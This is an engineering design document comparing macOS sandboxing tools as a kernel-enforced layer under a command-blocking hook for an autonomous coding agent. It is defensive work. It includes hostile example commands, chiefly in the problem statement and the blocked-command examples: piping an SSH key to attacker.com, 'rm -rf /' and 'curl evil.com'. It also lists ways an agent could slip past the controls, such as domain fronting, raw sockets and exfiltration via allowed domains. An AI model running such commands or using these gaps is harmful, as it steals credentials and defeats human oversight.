# Protocol: OS-Level Sandboxing for Autopilot
# Location: ~/MCPs/autopilot/protocols/sandboxing.md
# Purpose: Kernel-enforced sandbox as a second defense layer beneath guardian.sh
# Last updated: 2026-04-04

---

## Problem Statement

Guardian (bin/guardian.sh) blocks dangerous commands via pattern matching on tool call JSON. This catches known-bad patterns but has fundamental limitations:

- **Novel commands bypass it.** A pattern-matching blocklist cannot anticipate every dangerous invocation. Obfuscated commands, indirect execution (e.g., `python -c "import os; os.system('rm -rf /')"`) , and unknown tools can slip through.
- **Read exfiltration is invisible.** Guardian focuses on destructive writes. An agent could `cat ~/.ssh/id_rsa | curl attacker.com` using an allowed egress domain or encoding trick.
- **Environment variables leak.** Commands inherit the full shell environment (AWS credentials, API keys, tokens) with no restriction.

OS-level sandboxing addresses these by enforcing filesystem and network boundaries at the kernel, below the application layer. Even if a command bypasses guardian's patterns, the kernel blocks the syscall before it touches a protected resource.

---

## Evaluation: macOS Sandboxing Options

### Option 1: Claude Code Built-in Sandbox (`/sandbox`) -- RECOMMENDED

**What it is:** Anthropic's official sandbox, built into Claude Code since v1.0.29. Uses Apple's Seatbelt framework (sandbox-exec) on macOS, bubblewrap on Linux. Available as the open-source npm package `@anthropic-ai/sandbox-runtime` (repo: `anthropic-experimental/sandbox-runtime`).

**How it works:**
- Dynamically generates Seatbelt profiles at runtime
- Restricts filesystem writes to the current working directory by default
- Routes all network traffic through a localhost proxy that enforces domain allowlists
- All child processes inherit the sandbox boundaries (kernel-enforced, not voluntary)
- Clears and rebuilds the process environment, preventing credential leakage via env vars
- Configurable via `settings.json` with `sandbox.*` keys

**Configuration example:**
```json
{
  "sandbox": {
    "enabled": true,
    "autoAllow": true,
    "filesystem": {
      "allowWrite": [".", "~/MCPs/autopilot"],
      "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"],
      "denyWrite": [".env", "secrets/"]
    },
    "network": {
      "allowedDomains": [
        "github.com", "*.github.com",
        "api.anthropic.com",
        "registry.npmjs.org"
      ]
    }
  }
}
```

**Installation:** None required on macOS -- Seatbelt is built into the OS. Enable with `/sandbox` command in Claude Code.

**Strengths:**
- Zero additional dependencies on macOS
- Maintained by Anthropic, designed specifically for Claude Code
- Settings merge across scopes (managed, user, project)
- 84% reduction in permission prompts (Anthropic's internal data)
- Domain-based network filtering (not just port-based like raw sandbox-exec)
- Escape hatch: `dangerouslyDisableSandbox` falls back to permission flow (can be disabled)
- Open-source for use in other agent projects

**Limitations:**
- Only sandboxes Bash tool -- Read, Edit, Write tools use the permission system directly
- Network filtering is domain-based only (no URL path or payload inspection)
- Domain fronting can potentially bypass network restrictions
- `allowUnixSockets` can inadvertently expose Docker socket or other privileged sockets
- No learning/discovery mode -- you must know what to allow upfront
- Cannot apply per-command sandbox profiles (all commands in a session share the same sandbox)

**Verdict: PRIMARY RECOMMENDATION for Autopilot.** Native integration, zero friction, Anthropic-maintained.

---

### Option 2: Greywall (GreyhavenHQ)

**What it is:** Open-source (Apache 2.0), container-free, deny-by-default sandbox for AI coding agents. Built by Greyhaven (forked from Fence by Tusk AI). Latest release: v0.3.0 (April 2026). GitHub: `GreyhavenHQ/greywall`.

**How it works (macOS):**
- Uses sandbox-exec (Seatbelt) for filesystem/network/IPC restrictions
- Single unified Seatbelt layer (vs. five-layer defense on Linux: bubblewrap + Landlock + seccomp + eBPF + TUN)
- Network traffic routed via environment variables to greyproxy (SOCKS5 on localhost:43052, DNS on localhost:43053)
- Learning mode: `greywall --learning -- <command>` traces filesystem access via `eslogger` (requires sudo on macOS), auto-generates config profiles
- Profile system for per-agent configurations: `greywall --profile claude,python -- claude`

**Installation:**
```bash
brew tap greyhavenhq/tap
brew install greywall
```

**Configuration:** `~/Library/Application Support/greywall/greywall.json`
```json
{
  "network": {
    "proxyUrl": "socks5://localhost:1080"
  },
  "filesystem": {
    "defaultDenyRead": true,
    "allowRead": ["~/.config/myapp"],
    "allowWrite": ["."],
    "denyWrite": ["~/.ssh/**"],
    "denyRead": ["~/.ssh/id_*", ".env"]
  },
  "command": {
    "deny": ["git push", "npm publish"]
  }
}
```

**Usage:** `greywall -- claude` or `greywall -c "npm run dev"`

**Strengths:**
- Learning mode auto-discovers filesystem requirements (unique feature -- very useful for initial profiling)
- Live allow/deny dashboard for network requests in real time
- Agent-agnostic -- works with Claude, Cursor, Aider, Codex, etc.
- Built-in command blocking layer (overlaps with guardian)
- Dynamic mid-session permission adjustment without restart

**Limitations on macOS:**
- Transparent network proxy (TUN-based) is NOT available on macOS -- relies on env var proxying
- Programs making raw socket connections bypass the proxy entirely (Greyhaven acknowledges this)
- DNS capture NOT available on macOS
- No PID namespaces on macOS
- Learning mode requires sudo for eslogger on macOS
- Single Seatbelt layer vs. five-layer defense on Linux (reduced defense-in-depth)
- No published performance benchmarks

**Verdict: STRONG ALTERNATIVE.** Learning mode is genuinely useful for profile discovery. Best value if you need agent-agnostic sandboxing across multiple tools, or if you want the live dashboard for monitoring. However, macOS support is demonstrably weaker than Linux.

---

### Option 3: Agent Safehouse (eugene1g)

**What it is:** macOS-native kernel-level sandboxing for local AI agents. Ships as a single self-contained Bash script. Open source (Apache 2.0). GitHub: `eugene1g/agent-safehouse`.

**How it works:**
- Wraps commands in sandbox-exec with a deny-first Seatbelt profile
- Denies write access outside the project directory (git root by default)
- Grants read-only access to installed toolchains
- Denies access to ~/.ssh, ~/.aws, and other credential directories by default
- The kernel blocks syscalls before any file is touched

**Installation:**
```bash
brew install eugene1g/safehouse/agent-safehouse
# Or: download single script to ~/.local/bin/safehouse
```

**Usage:** `safehouse <command>`

**Strengths:**
- Single Bash script, no compiled dependencies, trivially auditable
- Designed specifically for macOS (not a Linux-first port)
- Tested with Claude Code, Codex, Aider, Cursor, and many other agents
- Includes LLM prompt generator for profile customization
- Minimal attack surface

**Limitations:**
- No network isolation (filesystem only) -- critical gap for exfiltration prevention
- No learning/discovery mode
- Less actively developed than Greywall
- No dynamic permission adjustment

**Verdict: LIGHTWEIGHT OPTION.** Good if you want the simplest possible filesystem sandbox with zero overhead. Insufficient alone because it lacks network isolation.

---

### Option 4: Raw sandbox-exec (Apple Seatbelt)

**What it is:** macOS's built-in command-line sandboxing tool. Ships with every Mac. Uses Seatbelt kernel extension to enforce sandbox profiles written in SBPL (Scheme-based Profile Language).

**How it works:**
```bash
sandbox-exec -f profile.sb <command>
# or inline:
sandbox-exec -p '(version 1)(deny default)(allow file-read* (subpath "/usr"))' <command>
```

**Profile syntax (SBPL):**
```scheme
(version 1)
(deny default)

;; Allow reading system libraries
(allow file-read* (subpath "/usr/lib"))
(allow file-read* (subpath "/usr/share"))
(allow file-read* (subpath "/System"))

;; Allow read/write to project directory
(allow file-read* (subpath "/Users/rishi_kolisetty/MCPs/autopilot"))
(allow file-write* (subpath "/Users/rishi_kolisetty/MCPs/autopilot"))

;; Allow process execution
(allow process-exec (literal "/bin/bash"))
(allow process-exec (literal "/usr/bin/env"))

;; Block all network
(deny network*)

;; Allow specific outbound (if needed)
;; (allow network-outbound (remote tcp "*:443"))
```

**Debugging violations:** `log stream --style compact --predicate 'sender=="Sandbox"'`

**Pre-built system profiles:** `/System/Library/Sandbox/Profiles/`

**Deprecation status:** Apple marks sandbox-exec as deprecated to steer developers toward App Sandbox entitlements. However, Seatbelt itself is NOT deprecated -- it is the sandbox mechanism used by Chrome, all App Store apps, and Apple's own system services. Community consensus: functional, unlikely to be removed, but undocumented and unsupported.

**Strengths:**
- Zero dependencies -- built into macOS
- Kernel-enforced, applies to all child processes
- Fine-grained control over filesystem, network, IPC, process execution

**Limitations:**
- SBPL syntax is entirely undocumented by Apple
- Profile development is pure trial-and-error
- Network filtering is port-based only (cannot whitelist by domain)
- Profiles may break across macOS major versions
- No learning mode, no tooling, no dashboard

**Verdict: BUILDING BLOCK, NOT A SOLUTION.** This is the primitive that Options 1-3 all use under the hood. Do not build directly on sandbox-exec unless you have a specific need the higher-level tools don't cover.

---

### Option 5: VM-Based Isolation (Lima, Tart, OrbStack)

**What it is:** Lightweight virtual machines using Apple's Virtualization.framework on Apple Silicon. Each VM gets its own Linux kernel.

| Tool | Boot time | RAM overhead | FS perf (bind mount) | License |
|------|-----------|-------------|----------------------|---------|
| Lima | ~5s | Moderate | ~3x slower than native | Apache 2.0 (CNCF) |
| OrbStack | ~2s | 40% less | Near-native | Commercial |
| Tart | ~3s | Moderate | N/A (no mounts) | Apache 2.0 |

**Verdict: OVERKILL for Autopilot.** Strongest isolation (hypervisor boundary) but incompatible with Autopilot's hook-based architecture. Guardian hooks run on the host; the agent must also run on the host. VMs make sense for untrusted third-party code, not for a single-user dev agent.

---

## Recommendation

**Use Claude Code's built-in sandbox as the primary OS-level enforcement layer.**

It is the only option that:
1. Integrates natively with Claude Code's tool execution pipeline
2. Requires zero additional dependencies on macOS
3. Provides both filesystem AND network isolation
4. Is maintained by the same team that builds the agent
5. Has domain-based network filtering (not just port-based)

### Defense-in-Depth Stack

```
Layer 0: Claude Code permission system (tool-level allow/deny rules)
Layer 1: Guardian hook (pattern-matching blocklist, <5ms per command)
Layer 2: Claude Code sandbox (kernel-enforced Seatbelt, filesystem + network)
Layer 3: Review gate (Sonnet cross-check for L3+ operations)
```

Guardian and the sandbox are complementary, not redundant:
- **Guardian** operates on the tool call JSON *before* execution. It can block commands based on semantic patterns (e.g., "any command mentioning production") that the sandbox cannot express.
- **Sandbox** operates on the process *during* execution. It blocks syscalls the kernel deems out-of-bounds, catching anything guardian's patterns miss.

### Optional Enhancement: Greywall for Discovery

During initial setup or when onboarding new tools, use Greywall's learning mode to discover filesystem access requirements:

```bash
# One-time: discover what Claude Code actually needs
brew tap greyhavenhq/tap && brew install greywall
greywall --learning -- claude

# Review discovered profile
greywall profiles show claude

# Translate discovered paths into sandbox.filesystem settings
```

This is a one-time profiling step, not a runtime dependency.

---

## Integration Plan: Guardian + Sandbox

### Phase 1: Enable Built-in Sandbox (Immediate)

Add sandbox configuration to Autopilot's Claude Code settings.

**File: `~/MCPs/autopilot/.claude/settings.json`** (add or merge):
```json
{
  "sandbox": {
    "enabled": true,
    "autoAllow": true,
    "failIfUnavailable": true,
    "allowUnsandboxedCommands": false,
    "filesystem": {
      "allowWrite": [
        ".",
        "/tmp/autopilot-*"
      ],
      "denyRead": [
        "~/.ssh",
        "~/.aws",
        "~/.gnupg",
        "~/.config/gh",
        "~/.netrc",
        "~/.npmrc"
      ],
      "denyWrite": [
        ".env",
        ".env.local",
        "~/.claude/settings.json",
        "~/.claude/settings.local.json"
      ]
    },
    "network": {
      "allowedDomains": [
        "github.com",
        "*.github.com",
        "api.vercel.com",
        "vercel.com",
        "*.supabase.com",
        "*.supabase.co",
        "api.anthropic.com",
        "registry.npmjs.org",
        "pypi.org",
        "api.telegram.org",
        "api.alpaca.markets",
        "paper-api.alpaca.markets",
        "data.alpaca.markets",
        "api.stripe.com",
        "api.razorpay.com",
        "api.cloudflare.com",
        "localhost",
        "127.0.0.1"
      ]
    },
    "excludedCommands": [
      "docker *"
    ]
  }
}
```

**Key settings explained:**
- `failIfUnavailable: true` -- sandbox is mandatory, not optional. Autopilot cannot run if sandbox breaks.
- `allowUnsandboxedCommands: false` -- the escape hatch is disabled. Commands that fail in the sandbox go through guardian + permission flow; they never run uncontained.
- `network.allowedDomains` mirrors guardian's `egress_allowlist` in `config/guardian-rules.yaml`. Keep them in sync.
- `excludedCommands: ["docker *"]` -- Docker is incompatible with running inside the sandbox. Guardian handles Docker command safety separately.

### Phase 2: Guardian Sandbox Awareness (Short-term)

Update guardian.sh to detect sandbox state and provide observability:

```bash
# Add near the top of guardian.sh, after autopilot detection:

# =============================================================================
# SANDBOX STATE DETECTION
# Detect if Claude Code sandbox is active for this session.
# Guardian still enforces all rules regardless -- this is for logging/observability.
# =============================================================================

_sandbox_active=false
if [ -f "${HOME}/.claude/settings.json" ]; then
    _sandbox_enabled=$(jq -r '.sandbox.enabled // false' "${HOME}/.claude/settings.json" 2>/dev/null)
    if [ "$_sandbox_enabled" = "true" ]; then
        _sandbox_active=true
    fi
fi

# In the block() function, add sandbox context to logs:
# echo "  Sandbox active: $_sandbox_active" >&2
```

This does NOT relax guardian's rules -- it provides observability. Guardian logs can indicate whether a blocked command would have also been caught by the sandbox, helping identify redundant rules over time.

### Phase 3: L3+ Sandbox Hardening (Medium-term, Aspirational)

For L3+ operations that pass the review gate, temporarily tighten the sandbox before execution. This is aspirational -- Claude Code does not currently support per-command sandbox profiles. If Anthropic adds this capability, Autopilot should use it:

```
L3 operation arrives
    -> Guardian allows (not a blocked pattern)
    -> Review gate approves
    -> Apply tightened sandbox overlay:
        - filesystem.allowWrite restricted to deploy tooling only
        - filesystem.denyWrite includes src/, lib/, config/
        - network.allowedDomains restricted to the specific service being deployed to
    -> Execute command
    -> Restore normal sandbox config
```

---

## Example: Wrapping Commands in a Sandbox

### Using Claude Code's built-in sandbox (recommended, automatic)

No wrapping needed. Once sandbox is enabled in settings, ALL Bash tool invocations are automatically sandboxed. The runtime generates and applies the Seatbelt profile before the command executes.

```
# These commands are sandboxed automatically when sandbox.enabled = true:
npm install        # allowed: writes to ./node_modules (within project dir)
cat ~/.ssh/id_rsa  # BLOCKED: ~/.ssh is in denyRead
curl evil.com      # BLOCKED: evil.com not in allowedDomains
rm -rf /           # BLOCKED: / not in allowWrite (also blocked by guardian)
```

### Using Anthropic's sandbox-runtime standalone (for non-Claude contexts)

```bash
# Install
npm install -g @anthropic-ai/sandbox-runtime

# Create settings
cat > ~/.srt-settings.json << 'EOF'
{
  "network": {
    "allowedDomains": ["github.com", "*.github.com"],
    "deniedDomains": []
  },
  "filesystem": {
    "denyRead": ["~/.ssh", "~/.aws"],
    "allowWrite": ["."],
    "denyWrite": [".env"]
  }
}
EOF

# Run any command sandboxed
npx @anthropic-ai/sandbox-runtime "npm install"
npx @anthropic-ai/sandbox-runtime "cat ~/.ssh/id_rsa"  # BLOCKED by kernel
```

### Using raw sandbox-exec (for understanding what happens under the hood)

```bash
# Minimal deny-default profile for running a build command
sandbox-exec -p '
(version 1)
(deny default)

;; System libraries (required for any process to run)
(allow file-read* (subpath "/usr/lib"))
(allow file-read* (subpath "/usr/share"))
(allow file-read* (subpath "/System"))
(allow file-read* (subpath "/Library/Frameworks"))
(allow file-read* (subpath "/private/var"))
(allow file-read-metadata)

;; Project directory: full access
(allow file-read* (subpath "/Users/rishi_kolisetty/MCPs/autopilot"))
(allow file-write* (subpath "/Users/rishi_kolisetty/MCPs/autopilot"))

;; Temp directories
(allow file-read* (subpath "/tmp"))
(allow file-write* (subpath "/tmp"))

;; Process execution
(allow process-exec*)
(allow process-fork)

;; Block all network
(deny network*)

;; Block credential directories explicitly
(deny file-read* (subpath "/Users/rishi_kolisetty/.ssh"))
(deny file-read* (subpath "/Users/rishi_kolisetty/.aws"))
(deny file-read* (subpath "/Users/rishi_kolisetty/.gnupg"))
' /bin/bash -c "npm run build"
```

---

## Risks and Trade-offs

### Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| sandbox-exec deprecation by Apple | Low | Seatbelt is used by Chrome, all App Store apps, and Apple system services. Cannot be removed without breaking macOS. Claude Code would adapt if API changes. |
| Domain fronting bypasses network sandbox | Medium | Guardian's egress allowlist provides pattern-level defense. Monitor sandbox violation logs for anomalous connections. |
| Profile too restrictive breaks legitimate workflows | Medium | Start with Claude Code defaults, iterate. Use Greywall learning mode for initial discovery. Monitor denial logs. |
| Performance overhead from proxy-based network filtering | Low | Anthropic reports "minimal" overhead. Real-world reports confirm sub-second impact on npm install. |
| `allowUnixSockets` exposing Docker socket | High | Do not enable `allowUnixSockets` broadly. Docker goes in `excludedCommands`, guardian handles Docker safety. |
| Environment variable leakage | Medium | Claude Code sandbox clears and rebuilds the process environment. Guardian should additionally block commands targeting credential env vars. |
| Allowed domain exfiltration (e.g., creating a GitHub gist with stolen data) | Medium | Guardian's semantic patterns are the defense here. Sandbox cannot distinguish "legitimate push" from "exfiltration push" to the same domain. |

### Trade-offs

| Decision | Trade-off |
|----------|-----------|
| Claude Code sandbox over Greywall | Tighter integration, zero deps vs. no learning mode, no live dashboard |
| `allowUnsandboxedCommands: false` | Maximum security vs. some commands fail that would otherwise work |
| `failIfUnavailable: true` | Guaranteed enforcement vs. Autopilot cannot run if sandbox breaks |
| Keeping guardian active alongside sandbox | Defense-in-depth (two independent layers) vs. slight overhead (<5ms) |
| Not using VM isolation | Native performance, hook compatibility vs. weaker boundary (shared kernel) |
| Network allowlist mirroring guardian egress list | Consistent policy vs. two places to update for new services |

### What the Sandbox Does NOT Protect Against

1. **Prompt injection:** The sandbox restricts what runs, not what the agent decides to run. A jailbroken agent could exfiltrate data to an allowed domain.
2. **Read/Edit tool abuse:** Claude Code's Read, Edit, and Write tools bypass the Bash sandbox entirely. Permission rules are the only control for these tools.
3. **Allowed domain exfiltration:** If `github.com` is allowed, an agent could push sensitive data there. Guardian's semantic patterns are the defense.
4. **Time-of-check-to-time-of-use:** Guardian checks the command string; the sandbox enforces execution. A command could behave differently than its string suggests.
5. **macOS major version breakage:** Apple could change Seatbelt behavior in a future release. Monitor after upgrades.

---

## Maintenance

### When to update sandbox config:
- Adding a new service to `services/INDEX.md` -> add its API domain to `network.allowedDomains` AND guardian's `egress_allowlist`
- Adding a new tool that writes outside the project dir -> add path to `filesystem.allowWrite`
- After macOS major version upgrades -> verify sandbox functions (`/sandbox` status check)

### Sync checklist (guardian-rules.yaml <-> sandbox settings):
- `egress_allowlist` domains must appear in `sandbox.network.allowedDomains`
- Guardian's self-protection paths should appear in `sandbox.filesystem.denyWrite`
- New categories added to guardian should be evaluated for sandbox-level enforcement

### Monitoring:
- macOS sandbox violations: `log stream --style compact --predicate 'sender=="Sandbox"'`
- Claude Code sandbox events: Check session output for sandbox-related warnings
- Guardian blocks: Logged to stderr with `GUARDIAN BLOCKED [category]` prefix

---

## Research Sources

- [Greywall GitHub](https://github.com/GreyhavenHQ/greywall) -- Container-free sandbox, Apache 2.0
- [Greywall website](https://greywall.io) -- Feature overview and agent compatibility
- [Greyhaven: Why we built our own sandboxing system](https://greyhaven.co/insights/why-we-built-our-own-sandboxing-sytem) -- Architecture decisions and five-layer design
- [Agent Safehouse](https://agent-safehouse.dev/) -- macOS-native single-script sandbox
- [Anthropic sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) -- Open-source sandbox used by Claude Code
- [Claude Code Sandboxing Docs](https://code.claude.com/docs/en/sandboxing) -- Official documentation
- [Anthropic: Claude Code Sandboxing Engineering](https://www.anthropic.com/engineering/claude-code-sandboxing) -- Design rationale
- [sandbox-exec deep dive](https://igorstechnoclub.com/sandbox-exec/) -- SBPL syntax and profile writing guide
- [Seatbelt profiles repository](https://github.com/s7ephen/OSX-Sandbox--Seatbelt--Profiles) -- Community profile collection
- [Deep dive on agent sandboxes](https://pierce.dev/notes/a-deep-dive-on-agent-sandboxes) -- Codex and Claude sandbox internals comparison
- [Sandboxing Claude Code on macOS](https://www.infralovers.com/blog/2026-02-15-sandboxing-claude-code-macos/) -- Practical evaluation of all approaches with benchmarks
- [HN: sandbox-exec deprecation discussion](https://news.ycombinator.com/item?id=44283454) -- Expert opinions on Seatbelt viability
- [Claude srt analysis](https://perrotta.dev/2026/03/claude-srt-sandbox-runtime/) -- Practical sandbox-runtime experience report
